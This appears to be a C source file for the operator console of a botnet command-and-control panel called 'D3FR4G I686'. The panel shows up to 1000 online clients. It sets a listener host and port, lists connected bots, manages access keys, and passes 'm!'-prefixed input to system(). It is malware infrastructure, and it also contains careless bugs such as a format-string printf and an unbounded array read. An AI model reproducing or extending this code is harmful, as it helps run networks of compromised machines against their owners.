#include "common/term.h"

extern cmd_t sendv;
extern int32_t svsocket;

void quit_program(char *s) {
  close(svsocket);
  free(sendv.command);
  free(s);
  exit(0);
}
void InterruptHandler(int sig) {
  switch (sig) {
  case SIGINT:
    printf("\n%s[WARNING]%s CTRL + C has been disabled, use: exit\n", RED,
           RESET);
    break;
  case SIGTSTP:
    printf("\n%s[WARNING]%s CTRL + Z has been disabled, use: exit\n", RED,
           RESET);
    break;
  default:
    printf("\n%s[WARNING]%s Avoid using interrupts!!\n", RED, RESET);
  }
}

uint32_t DisplayTerminal(data_t *dados, Connection_m *cnx_m) {
  banner(dados->clients_on);

  sendv.command = malloc(Kb);
  signal(SIGINT, InterruptHandler);
  signal(SIGTSTP, InterruptHandler);

  while (dados->PressIT) {

    // printf("%s[%s %sDefrag I686 %s%s]~[%s %s%s %s]↛ ", BRANCO,Bblack, RED,
    // BRANCO,RESET, Bblack,RED, "HWID", RESET);
    printf("%s[ %sDefrag I686 %s%s]~[ %s%s %s]↛ ", BRANCO, RED, BRANCO, RESET,
           RED, "HWID", RESET);

    fgets(sendv.command, Kb, stdin);
    if (sendv.command == NULL)
      exit(1);

    sendv.command[df_strlen(sendv.command) - 1] = '\0';
    VerifyCommand(sendv.command, cnx_m, dados);
  }
  free(sendv.command);

  return 0;
}

uint32_t VerifyCommand(char *cmd_v, Connection_m *cnx_m, data_t *data) {

  if (!df_strcmp(cmd_v, "clear", 5)) {
    puts("\033c");
    banner(data->clients_on);
  }

  else if (!df_strcmp(cmd_v, "init conect", 11)) {
    if ((InitConec(cnx_m->lhost, cnx_m->lport)) == 1) {
      printf("%s[WARNING]%s Enter the local ip address and/or port!\n", RED,
             RESET);
    }
  }

  else if (!df_strcmp(cmd_v, "help", 4))
    ListHelp();

  else if (!df_strcmp(cmd_v, "m!", 2))
    system((cmd_v + 2));

  else if (!df_strcmp(cmd_v, "show configs", 12))
    ShowOptions(cnx_m);

  else if (!df_strcmp(cmd_v, "set lhost", 9))
    df_memcpy(cnx_m->lhost, (cmd_v + 10), 40);

  else if (!df_strcmp(cmd_v, "set lport", 9))
    cnx_m->lport = atoi((cmd_v + 9));

  else if (!df_strcmp(cmd_v, "onlines", 7))
    data->clients_on = onlines();

  else if (!df_strcmp(cmd_v, "list clients", 12))
    listclients();

  else if (!df_strcmp(cmd_v, "create key", 10))
    printf("Key: %ld\n", CreateKey());

  else if (!df_strcmp(cmd_v, "add key", 7))
    gnckey((cmd_v + 8), 1);

  else if (!df_strcmp(cmd_v, "remove key", 10))
    gnckey((cmd_v + 11), 2);
  else if (!df_strcmp(cmd_v, "list key", 8))
    gnckey(NULL, 3);

  else if (!df_strcmp(cmd_v, "exit", 4)) {
    char op[4];
    printf("%s[WARNING]%s Are you sure you want to quit %s(yes/nop)%s?", RED,
           BRANCO, RED, RESET);
    printf("\n%s↛%s ", BRANCO, RESET);
    fgets(op, sizeof(op), stdin);
    if (!df_strcmp(op, "yes", 3))
      quit_program(data->name);

    return 0;
  } else if (df_strlen(cmd_v) > 1)
    printf("%s[-]%s Unknown command: %s\n", RED, RESET, cmd_v);
  df_memset(sendv.command, '\0', df_strlen(sendv.command));
  return 0;
}

void ShowOptions(Connection_m *cnx_m) {
  puts("Name   Current Setting");
  puts("----   ---------------");
  printf("LHOST  %s             \n", cnx_m->lhost);
  printf("LPORT  %d             \n", cnx_m->lport);

  puts("\n\nDescription");
  puts("-----------");
  puts("LHOST ↛ The listen address (an interface may be specified)");
  puts("LPORT ↛ The listen port");

  puts("\n\nCommands");
  puts("--------");
  puts("set lhost <ip>");
  puts("set lport <port>");
}

void ListHelp() {
  FILE *defaultcmd = fopen(PATH_COMMANDS, "r");
  char Dtc_t[100][100];
  int i = 0;
  if (defaultcmd != NULL)
    while (fgets(Dtc_t[i], 100, defaultcmd) != NULL)
      printf(Dtc_t[i]);
  else
    return;
  puts("");
  fclose(defaultcmd);
}

void inits_data(data_t *dados, Connection_m *conex) {
  dados->PressIT = 1;
  dados->name = malloc(Kb);
  dados->clients_on = 0;
  conex->lhost = malloc(40);
}

void banner(unsigned int clients_onlines) {
  printf("═════════════════════════════════════════════════════════════════════"
         "════════════════════\n\n\n\n"
         "\t██████╗ ███████╗███████╗██████╗  █████╗  ██████╗      "
         "██████╗██████╗ \n"
         "\t██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝     "
         "██╔════╝╚════██╗\n"
         "\t██║  ██║█████╗  █████╗  ██████╔╝███████║██║  ███╗    ██║      "
         "█████╔╝\n"
         "\t██║  ██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██║   ██║    ██║     "
         "██╔═══╝ \n"
         "\t██████╔╝███████╗██║     ██║  ██║██║  ██║╚██████╔╝    "
         "╚██████╗███████╗\n"
         "\t╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝      "
         "╚═════╝╚══════╝\n");
  printf("\t\t%s╔═══════════════════════════════════════════════════╗\n", RED);
  printf("\t\t║%s     Welcome to the start screen of D3FR4G I686    %s║\n",
         BRANCO, RED);
  printf("\t\t║%s         type [HELP] for help with commands        %s║\n",
         BRANCO, RED);
  printf("\t\t╚═══════════════════════════════════════════════════╝\n");
  printf("\t\t[%s  Clients Online: %s %d/1000 %s ]%s # CnC by D3FR4G "
         "I686\n\n\n\n\n\n",
         BRANCO, GREEN, clients_onlines, RED, RESET);
}
